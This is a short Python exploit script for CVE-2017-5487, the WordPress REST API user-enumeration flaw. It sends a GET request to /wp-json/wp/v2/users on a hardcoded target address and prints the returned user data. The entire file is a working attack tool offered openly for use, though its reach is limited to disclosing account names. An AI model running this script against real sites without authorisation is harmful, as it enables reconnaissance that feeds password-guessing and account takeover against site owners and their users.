#!/usr/bin/env python3
"""
CVE-2017-5487 Exploit
This script exploits the CVE-2017-5487 vulnerability.
Copyright (c) 2024 Anzinius
MIT License
"""

import requests

TARGET_IP = "192.168.1.100"
TARGET_PORT = 8080
TARGET_PROTOCOL = "http"
#TARGET_PROTOCOL = "https"

target_url = f"{TARGET_PROTOCOL}://{TARGET_IP}:{TARGET_PORT}"

def exploit():
    """
    This function sends a GET request to the target URL.
    """
    attack_path = "/wp-json/wp/v2/users"
    url = target_url + attack_path

    try:
        print(f"[+] Sending exploit to {url}")
        response = requests.get(url)

        if response.status_code == 200:
            print("[+] Exploit successful!")
            print("[+] Response:", response.json())
        else:
            print(f"[-] Exploit failed with status code: {response.status_code}")
    
    except Exception as e:
        print(f"[-] Error occurred: {e}")

if __name__ == "__main__":
    exploit()
